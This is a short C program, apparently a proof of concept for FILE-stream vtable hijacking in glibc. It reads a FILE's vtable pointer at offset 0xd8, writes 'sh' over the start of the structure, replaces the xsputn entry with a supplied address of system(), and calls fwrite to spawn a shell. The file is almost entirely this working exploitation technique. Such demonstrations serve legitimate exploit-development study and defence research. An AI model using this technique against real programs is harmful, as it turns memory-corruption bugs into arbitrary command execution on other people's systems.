#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char** argv)
{
    FILE *fp;
    long long *vtable_ptr;
    long long system_ptr = 0;

    if (argc < 2) {
        fprintf(stderr, "Usage %s [system address in hex]", argv[0]);
        exit(EXIT_FAILURE);
    }
    system_ptr = strtoll(argv[1], NULL, 16);
    fp = fopen("./123.txt", "w+");
    vtable_ptr = *(long long **)((long long)fp + 0xd8); //get vtable

    memcpy(fp, "sh", 3);

    vtable_ptr[7] = system_ptr; //xsputn

    fwrite("hi", 2, 1, fp);
}